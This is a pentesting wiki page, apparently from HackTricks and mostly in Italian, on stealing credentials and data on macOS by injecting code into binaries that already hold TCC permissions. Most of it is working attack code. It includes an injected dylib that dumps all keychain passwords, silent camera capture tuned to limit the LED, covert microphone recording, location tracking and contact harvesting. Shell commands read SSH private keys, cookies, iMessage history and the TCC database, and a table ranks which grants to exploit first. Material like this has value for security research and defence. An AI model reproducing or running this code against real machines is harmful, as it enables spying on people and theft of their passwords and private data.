# macOS Credential & Data Theft via TCC Permissions

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

macOS TCC (Transparency, Consent, and Control) protegge l'accesso ai dati sensibili dell'utente. Quando un attaccante **compromette un binario che ha già concessioni TCC**, eredita tali permessi. Questa pagina documenta il potenziale di sfruttamento di ciascuna autorizzazione TCC correlata al furto di dati.

> [!WARNING]
> L'iniezione di codice in un binario con concessioni TCC (via DYLD injection, dylib hijacking, or task port) **eredita silenziosamente tutte le sue autorizzazioni TCC**. Non viene mostrata nessuna richiesta aggiuntiva o verifica quando lo stesso processo legge dati protetti.

---

## Keychain Access Groups

### Il premio

Il Keychain di macOS memorizza:
- **Wi-Fi passwords** — tutte le credenziali delle reti wireless salvate
- **Website passwords** — le password dei siti web: Safari, Chrome (quando usa Keychain), e altri browser
- **Application passwords** — account email, credenziali VPN, token di sviluppo
- **Certificates and private keys** — firma del codice, client TLS, cifratura S/MIME
- **Secure notes** — segreti memorizzati dall'utente

### Autorizzazione: `keychain-access-groups`

Gli elementi del Keychain sono organizzati in **gruppi di accesso**. L'entitlement `keychain-access-groups` di un'app elenca i gruppi a cui può accedere:
```xml
<key>keychain-access-groups</key>
<array>
<string>com.apple.cfnetwork</string>   <!-- Network passwords -->
<string>com.apple.security.personal-information.identity</string>  <!-- Personal certs -->
<string>apple</string>                  <!-- Broad Apple group -->
<string>InternetAccounts</string>       <!-- Internet account passwords -->
</array>
```
### Exploitation
```bash
# Find binaries with broad keychain access groups
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND isAppleBin = 0
ORDER BY privileged DESC;"

# If you can inject into such a binary, enumerate keychain items:
security dump-keychain -d ~/Library/Keychains/login.keychain-db 2>&1 | head -100

# Find specific passwords
security find-generic-password -s "Wi-Fi" -w 2>&1
security find-internet-password -s "github.com" 2>&1
```
### Code Injection → Keychain Theft
```objc
// Injected dylib code — runs with the target's keychain groups
#import <Security/Security.h>

__attribute__((constructor))
void dumpKeychain(void) {
NSDictionary *query = @{
(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnAttributes: @YES,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecMatchLimit: (__bridge id)kSecMatchLimitAll
};

CFArrayRef results = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, (CFTypeRef *)&results);

if (status == errSecSuccess) {
NSArray *items = (__bridge NSArray *)results;
for (NSDictionary *item in items) {
NSString *service = item[(__bridge id)kSecAttrService];
NSString *account = item[(__bridge id)kSecAttrAccount];
NSData *passData = item[(__bridge id)kSecValueData];
NSString *password = [[NSString alloc] initWithData:passData encoding:NSUTF8StringEncoding];
// service, account, password — the full credential triple
}
}
}
```
---

## Accesso alla fotocamera (kTCCServiceCamera)

### Sfruttamento

Un binary con concessione TCC per la fotocamera (via `kTCCServiceCamera` o `com.apple.security.device.camera` entitlement) può acquisire foto e video:
```bash
# Find camera-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceCamera' AND auth_value=2;"
```
### Cattura silenziosa
```objc
// Injected into a camera-entitled process
#import <AVFoundation/AVFoundation.h>

@interface SilentCapture : NSObject <AVCaptureVideoDataOutputSampleBufferDelegate>
@property (strong) AVCaptureSession *session;
@end

@implementation SilentCapture
- (void)startCapture {
self.session = [[AVCaptureSession alloc] init];
AVCaptureDevice *camera = [AVCaptureDevice defaultDeviceWithMediaType:AVMediaTypeVideo];
AVCaptureDeviceInput *input = [AVCaptureDeviceInput deviceInputWithDevice:camera error:nil];
[self.session addInput:input];

AVCaptureVideoDataOutput *output = [[AVCaptureVideoDataOutput alloc] init];
[output setSampleBufferDelegate:self queue:dispatch_get_global_queue(0, 0)];
[self.session addOutput:output];

[self.session startRunning];
// Camera LED turns on — but a brief capture may go unnoticed
}

- (void)captureOutput:(AVCaptureOutput *)output
didOutputSampleBuffer:(CMSampleBufferRef)sampleBuffer
fromConnection:(AVCaptureConnection *)connection {
// Each frame can be saved to disk or exfiltrated
// Stop after capturing a few frames to minimize LED time
[self.session stopRunning];
}
@end
```
> [!TIP]
> A partire da **macOS Sonoma**, l'indicatore della fotocamera nella barra dei menu è persistente e non può essere nascosto programmaticamente. Su **versioni precedenti di macOS**, una breve acquisizione potrebbe non produrre un indicatore evidente.
 
---

## Microphone Access (kTCCServiceMicrophone)

### Exploitation

L'accesso al microfono acquisisce tutto l'audio dal microfono integrato, dalle cuffie o dai dispositivi di ingresso audio collegati:
```bash
# Find mic-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceMicrophone' AND auth_value=2;"
```
### Attacco: Ambient Recording
```objc
// Injected into a mic-entitled process
#import <AVFoundation/AVFoundation.h>

- (void)recordAudio {
NSURL *url = [NSURL fileURLWithPath:@"/tmp/recording.m4a"];
NSDictionary *settings = @{
AVFormatIDKey: @(kAudioFormatMPEG4AAC),
AVSampleRateKey: @44100.0,
AVNumberOfChannelsKey: @1
};
AVAudioRecorder *recorder = [[AVAudioRecorder alloc] initWithURL:url settings:settings error:nil];
[recorder record];
// Records everything: conversations, phone calls, ambient audio

// Stop after a duration
dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
dispatch_get_main_queue(), ^{
[recorder stop];
// Exfiltrate /tmp/recording.m4a
});
}
```
---

## Tracciamento della posizione (kTCCServiceLocation)

### Sfruttamento
```bash
# Find location-authorized binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service LIKE '%Location%' AND auth_value=2;"
```
### Monitoraggio continuo
```objc
#import <CoreLocation/CoreLocation.h>

@interface Tracker : NSObject <CLLocationManagerDelegate>
@end

@implementation Tracker
- (void)startTracking {
CLLocationManager *mgr = [[CLLocationManager alloc] init];
mgr.delegate = self;
mgr.desiredAccuracy = kCLLocationAccuracyBest;
[mgr startUpdatingLocation];
}

- (void)locationManager:(CLLocationManager *)manager
didUpdateLocations:(NSArray<CLLocation *> *)locations {
CLLocation *loc = locations.lastObject;
// loc.coordinate.latitude, loc.coordinate.longitude
// Reveals: home address, work address, travel patterns, daily routine
NSString *entry = [NSString stringWithFormat:@"%f,%f,%@\n",
loc.coordinate.latitude, loc.coordinate.longitude, [NSDate date]];
// Append to tracking log
}
@end
```
---

## Contatti / Calendario / Foto

### Esfiltrazione di dati personali

| Servizio TCC | Framework | Dati |
|---|---|---|
| `kTCCServiceAddressBook` | `Contacts.framework` | Nomi, email, telefoni, indirizzi |
| `kTCCServiceCalendar` | `EventKit` | Riunioni, partecipanti, luoghi |
| `kTCCServicePhotos` | `Photos.framework` | Foto, screenshot, metadata di posizione |
```bash
# Find authorized binaries for each service
for svc in kTCCServiceAddressBook kTCCServiceCalendar kTCCServicePhotos; do
echo "=== $svc ==="
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='$svc' AND auth_value=2;"
done
```
### Raccolta dei contatti
```objc
#import <Contacts/Contacts.h>

CNContactStore *store = [[CNContactStore alloc] init];
NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey,
CNContactEmailAddressesKey, CNContactPhoneNumbersKey];
CNContactFetchRequest *request = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];

[store enumerateContactsWithFetchRequest:request error:nil
usingBlock:^(CNContact *contact, BOOL *stop) {
// contact.givenName, contact.familyName
// contact.emailAddresses, contact.phoneNumbers
// All contacts exfiltrated for social engineering / spear phishing
}];
```
---

## Accesso all'account iCloud

### Autorizzazione: `com.apple.private.icloud-account-access`

Questa autorizzazione consente di comunicare con il servizio XPC `com.apple.iCloudHelper`, fornendo accesso a:
- **iCloud tokens** — token di autenticazione per l'Apple ID dell'utente
- **iCloud Drive** — documenti sincronizzati da tutti i dispositivi
- **iCloud Keychain** — password sincronizzate su tutti i dispositivi Apple
- **Find My** — posizione di tutti i dispositivi Apple dell'utente
```bash
# Find iCloud-entitled binaries
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE iCloudAccs = 1
ORDER BY privileged DESC;"
```
> [!CAUTION]
> Compromising an iCloud-entitled binary estende l'attacco da un **singolo dispositivo all'intero ecosistema Apple**: altri Macs, iPhones, iPads, Apple Watch. La sincronizzazione di iCloud Keychain implica che le password di tutti i dispositivi siano accessibili.

---

## Accesso completo al disco (kTCCServiceSystemPolicyAllFiles)

### Il permesso TCC più potente

Full Disk Access concede la possibilità di lettura a **ogni file del sistema**, inclusi:
- Dati di altre app (Messages, Mail, cronologia di Safari)
- Database TCC (rivelando tutti gli altri permessi)
- Chiavi SSH e configurazione
- Cookie del browser e token di sessione
- Database e cache delle applicazioni
```bash
# Find FDA-granted binaries
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND auth_value=2;"

# With FDA, read anything:
cat ~/Library/Messages/chat.db              # iMessage history
cat ~/Library/Safari/History.db             # Safari browsing history
cat ~/Library/Cookies/Cookies.binarycookies # Browser cookies
cat ~/.ssh/id_rsa                           # SSH private key
```
---

## Matrice di Priorità per lo Sfruttamento

Quando si valutano gli injectable TCC-granted binaries, dare priorità in base al valore dei dati:

| Priorità | TCC Permission | Perché |
|---|---|---|
| **Critico** | Full Disk Access | Accesso a tutto |
| **Critico** | TCC Manager | Può concedere qualsiasi permesso |
| **Alto** | Keychain Access Groups | Tutte le password memorizzate |
| **Alto** | iCloud Account Access | Compromissione multi-dispositivo |
| **Alto** | Input Monitoring (ListenEvent) | Keylogging |
| **Alto** | Accessibility | Controllo della GUI, auto-concessione dei permessi |
| **Medio** | Screen Capture | Acquisizione di dati visivi |
| **Medio** | Camera + Microphone | Sorveglianza |
| **Medio** | Contacts + Calendar | Dati per social engineering |
| **Basso** | Location | Tracciamento fisico |
| **Basso** | Photos | Dati personali |

## Script di enumerazione
```bash
#!/bin/bash
echo "=== TCC Credential Theft Surface Audit ==="

echo -e "\n[*] High-value TCC grants (injectable binaries):"
sqlite3 /tmp/executables.db "
SELECT path, tccPermsStr FROM executables
WHERE (noLibVal = 1 OR allowDyldEnv = 1)
AND tccPermsStr IS NOT NULL
AND tccPermsStr != ''
ORDER BY privileged DESC
LIMIT 30;" 2>/dev/null

echo -e "\n[*] Keychain-entitled injectable binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE entitlementsString LIKE '%keychain-access-groups%'
AND (noLibVal = 1 OR allowDyldEnv = 1);" 2>/dev/null

echo -e "\n[*] iCloud-entitled binaries:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE iCloudAccs = 1;" 2>/dev/null
```
## Riferimenti

* [Apple Developer — Keychain Services](https://developer.apple.com/documentation/security/keychain_services)
* [Apple Developer — TCC](https://developer.apple.com/documentation/security/protecting-the-user-s-privacy)
* [Objective-See — TCC Exploitation](https://objectivesee.org/blog/blog_0x4C.html)
* [OBTS v5.0 — iCloud Token Extraction (Wojciech Regula)](https://www.youtube.com/watch?v=_6e2LhmxVc0)

{{#include ../../../../banners/hacktricks-training.md}}
